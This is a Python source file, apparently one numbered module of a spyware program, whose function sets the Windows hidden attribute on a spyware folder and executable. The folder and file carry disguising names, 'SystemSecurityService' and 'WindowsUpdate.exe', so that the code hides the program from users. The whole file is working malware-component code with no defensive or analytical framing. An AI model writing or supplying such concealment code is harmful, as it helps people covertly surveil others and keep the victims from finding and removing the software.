"""
Function 3: Hide Spyware
Make spyware invisible to casual users
"""
import os
import sys
import ctypes

def hide_spyware():
    """
    Hide spyware executable using Windows hidden attribute
    Returns: Path of hidden spyware
    """
    try:
        # Get installation path
        appdata = os.environ.get('APPDATA', os.path.expanduser('~'))
        install_dir = os.path.join(appdata, 'SystemSecurityService')
        spyware_path = os.path.join(install_dir, 'WindowsUpdate.exe')
        
        # If directory exists, hide it
        if os.path.exists(install_dir):
            # Hide the entire folder (Windows)
            try:
                FILE_ATTRIBUTE_HIDDEN = 0x02
                ctypes.windll.kernel32.SetFileAttributesW(install_dir, FILE_ATTRIBUTE_HIDDEN)
                print(f"[Function 3] Spyware folder hidden: {install_dir}")
            except:
                print(f"[Function 3] Could not hide folder (permissions)")
            
            # Also try to hide specific file
            if os.path.exists(spyware_path):
                try:
                    ctypes.windll.kernel32.SetFileAttributesW(spyware_path, FILE_ATTRIBUTE_HIDDEN)
                    print(f"[Function 3] Spyware file hidden: {spyware_path}")
                except:
                    pass
                    
            return install_dir
        else:
            print(f"[Function 3] Installation directory not found")
            return None
            
    except Exception as e:
        print(f"[Function 3] Hiding failed: {e}")
        return None

if __name__ == "__main__":
    hide_spyware()
